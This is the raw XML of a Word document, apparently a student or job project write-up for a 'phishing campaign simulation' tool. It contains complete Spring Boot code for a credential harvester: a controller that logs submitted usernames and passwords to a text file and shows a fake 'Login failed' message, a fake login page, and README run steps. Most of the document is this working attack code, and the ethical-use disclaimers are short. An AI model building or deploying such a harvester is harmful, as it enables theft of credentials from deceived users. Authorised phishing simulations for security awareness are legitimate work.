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36E76" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Main Responsibilities:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F18288" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Build a simple Java web server using:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5245177A" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Spring Boot or basic Java HTTP server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACD29B1" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Create a fake login page (HTML/CSS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFBAA35" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Capture and log credentials when someone submits the fake form.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E618810" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Save captured info securely (into a simple text file or database).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412AC5AA" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Deliverables:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EDD085" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Landing page + server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A1443E" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRPr="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Handling form submissions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A09972" w14:textId="77777777" w:rsidR="005B3B54" w:rsidRDefault="005B3B54" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Document setup steps for the web server in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>the README</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005B3B54">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602DD3EE" w14:textId="35A9FECC" w:rsidR="00421B51" w:rsidRPr="005B3B54" w:rsidRDefault="00000000" w:rsidP="005B3B54">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5928393C" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">This tool is designed for ethical phishing campaign simulations. It sets up a simple Java web server using Spring Boot, presents a fake login page, captures submitted credentials, and logs them for analysis. </w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Important: Use this tool only for authorized security assessments with explicit permission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7728A296" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Project Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF254FE" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Use Spring Initializr (https://start.spring.io/) to create a new project with these dependencies:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B381E5" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>- Spring Web</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Thymeleaf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8AFE24" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Unzip and open the project in your preferred IDE.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B447DA6" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Project Structure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D952997" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t>src/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>├── main/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   ├── java/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │   └── com/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │       └── example/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │           └── phishingtool/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │               ├── PhishingToolApplication.java</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │               ├── controller/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │               │   └── LoginController.java</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   ├── resources/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │   ├── templates/</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>│   │   │   └── login.html</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>│   │   └── application.properties</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E694912" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Implementation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4824E864" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Main Application Class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AF42EA7" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>package com.example.phishingtool;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import org.springframework.boot.SpringApplication;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import org.springframework.boot.autoconfigure.SpringBootApplication;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>@SpringBootApplication</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>public class PhishingToolApplication {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    public static void main(String[] args) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        SpringApplication.run(PhishingToolApplication.class, args);</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AE8CD8" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Login Controller</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075DFB96" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>package com.example.phishingtool.controller;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import org.springframework.stereotype.Controller;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import org.springframework.web.bind.annotation.*;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import org.springframework.ui.Model;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import java.io.FileWriter;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import java.io.IOException;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>import java.time.LocalDateTime;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>@Controller</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>public class LoginController {</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    @GetMapping("/")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    public String showLoginForm() {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        return "login";</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:br/>
        <w:t xml:space="preserve">    @PostMapping("/submit")</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    public String handleLogin(@RequestParam String username,</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                              @RequestParam String password,</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                              Model model) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        try (FileWriter writer = new FileWriter("credentials.txt", true)) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            writer.write("Time: " + LocalDateTime.now() + "\n");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            writer.write("Username: " + username + "\n");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            writer.write("Password: " + password + "\n");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            writer.write("---------------\n");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        } catch (IOException e) {</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            e.printStackTrace();</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        model.addAttribute("message", "Login failed. Please try again.");</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        return "login";</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B89570D" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Fake Login Page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDD51FC" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;html xmlns:th="http://www.thymeleaf.org"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;head&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;title&gt;Login&lt;/title&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;style&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        body { font-family: Arial, sans-serif; background-color: #f2f2f2; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        .login-container { width: 300px; margin: 100px auto; padding: 20px; background-color: #fff; border-radius: 5px; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 5px 0 10px 0; border: 1px solid #ccc; border-radius: 3px; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        input[type=submit] { width: 100%; padding: 10px; background-color: #4CAF50; border: none; color: white; border-radius: 3px; cursor: pointer; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        input[type=submit]:hover { background-color: #45a049; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        .error { color: red; }</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/style&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/head&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;div class="login-container"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        &lt;h2&gt;Login&lt;/h2&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;form th:action="@{/submit}" method="post"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;label for="username"&gt;Username:&lt;/label&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="text" id="username" name="username" required&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;label for="password"&gt;Password:&lt;/label&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="password" id="password" name="password" required&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="submit" value="Login"&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/form&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">        &lt;p class="error" th:text="${message}"&gt;&lt;/p&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/div&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9EF63B" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. README.md Content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C590C6E" w14:textId="77777777" w:rsidR="00421B51" w:rsidRDefault="00000000">
      <w:r>
        <w:br/>
        <w:t># Phishing Campaign Simulation Tool</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>## Setup Instructions</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>1. Clone the Repository:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   git clone https://github.com/yourusername/phishing-tool.git</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Build the Project:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   mvn clean install</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Run the Application:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   mvn spring-boot:run</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>4. Open Browser:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">   http://localhost:8080/</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>## Captured Credentials</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Credentials are logged in 'credentials.txt' with a timestamp.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>## Ethical Use</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>This tool is only for ethical and authorized testing.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00421B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4787045">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1574503972">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1999848347">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="304090520">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="629215530">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2632800">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="81148739">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1569001666">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="116648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21B51"/>
    <w:rsid w:val="005B3B54"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D462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0EF8D3"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{F214C557-0004-4E03-BC24-DF52F207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JEAN DESIR</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-05-08T16:29:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-08T16:29:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>